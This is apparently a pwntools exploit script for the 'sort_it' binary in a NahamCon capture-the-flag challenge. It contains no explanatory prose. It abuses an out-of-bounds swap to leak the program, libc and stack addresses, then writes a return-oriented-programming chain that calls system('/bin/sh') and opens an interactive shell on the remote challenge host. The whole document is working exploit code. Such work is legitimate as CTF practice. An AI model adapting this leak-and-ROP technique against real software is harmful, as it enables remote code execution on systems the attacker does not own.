#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 31524 ./sort_it
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sort_it_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32326)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,aslr=False, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x5555555554fe
# b *0x5555555555d8
continue
c

'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

yn = 0x4030+0x8
pop_rdi = 0x0000000000001643
pop_rsi = 0x0000000000001641

l = exe.libc

def swap(no1,no2):
    io.sendlineafter("select: ",str(no1))
    io.sendlineafter("it with: ",str(no2))

io.send("\n")

swap(1,21)

p = 'n'.ljust(8,"\x00")
p += p64(0xdeadbeef)
io.sendlineafter("[y/n]: ",p)

swap(2,14)

p = 'n'.ljust(8,"\x00")
p += p64(0xdeadbeef)
io.sendlineafter("[y/n]: ",p)

swap(3,11)

p = 'n'.ljust(8,"\x00")
p += p64(0xdeadbeef)
io.sendlineafter("[y/n]: ",p)

io.recvuntil("1. ")
base_exe = (io.recvline()[:-1]).ljust(8,"\x00")
base_exe = u64(base_exe) - 0x10d0
print (hex(base_exe))

io.recvuntil("2. ")
leak = (io.recvline()[:-1]).ljust(8,"\x00")

l.address = u64(leak) - l.sym["__libc_start_main"] - 234 -9

# print (hex(u64(leak)))
print (hex(l.address))

io.recvuntil("3. ")
leak = (io.recvline()[:-1]).ljust(8,"\x00")
stack = u64(leak) - 0x150
print (hex(stack))

yn = base_exe + yn
temp = -(stack - yn)/8 + 1
print temp

swap(4,temp)

p = 'n'.ljust(8,"\x00")
p += p64(base_exe + pop_rdi)
io.sendlineafter("[y/n]: ",p)

swap(14,temp)

p = 'n'.ljust(8,"\x00")
p += p64(l.search("/bin/sh").next())
io.sendlineafter("[y/n]: ",p)

swap(15,temp)

p = 'n'.ljust(8,"\x00")
p += p64(base_exe + pop_rsi)
io.sendlineafter("[y/n]: ",p)

swap(16,temp)

p = 'n'.ljust(8,"\x00")
p += p64(0)
io.sendlineafter("[y/n]: ",p)

swap(17,temp)

p = 'n'.ljust(8,"\x00")
p += p64(0)
io.sendlineafter("[y/n]: ",p)

swap(18,temp)

p = 'n'.ljust(8,"\x00")
p += p64(l.sym["system"])
io.sendlineafter("[y/n]: ",p)

swap(19,temp)

for i in range(10):
    p = 'n'.ljust(8,"\x00")
    p += p64(i)
    io.sendlineafter("[y/n]: ",p)
    swap(i+1,temp)

io.sendlineafter("[y/n]: ",'y')
io.interactive()
